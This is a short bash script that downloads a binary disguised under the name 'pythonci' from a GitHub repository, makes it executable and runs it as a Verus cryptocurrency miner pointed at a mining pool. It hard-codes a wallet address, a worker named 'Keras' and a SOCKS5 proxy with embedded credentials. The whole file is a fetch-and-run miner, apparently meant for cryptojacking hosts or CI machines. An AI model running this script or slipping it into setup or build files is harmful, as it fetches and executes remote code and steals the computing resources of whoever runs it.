#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install screen libjansson4 -y
wget https://github.com/uaaoxjdr/tesskepa/raw/main/pythonci
chmod +x pythonci
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RFjeLpKzaG94EnaidkK2PvgdNR5Q5nTnbW
WR=Keras
PY=socks5://mxxbceyq:ie954kf96kht@23.236.162.200:9247
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
